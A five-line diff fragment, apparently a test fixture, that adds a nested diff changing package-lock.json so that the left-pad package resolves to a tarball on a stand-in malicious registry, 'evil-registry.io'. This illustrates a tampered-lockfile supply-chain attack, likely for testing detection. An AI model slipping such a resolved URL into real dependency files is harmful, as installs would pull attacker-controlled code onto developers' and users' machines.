@@ -1,0 +1,5 @@
+diff --git a/package-lock.json b/package-lock.json
+--- a/package-lock.json
++++ b/package-lock.json
+@@ -10,3 +10,4 @@
++      "resolved": "https://r.evil-registry.io/left-pad/-/left-pad-1.0.0.tgz",
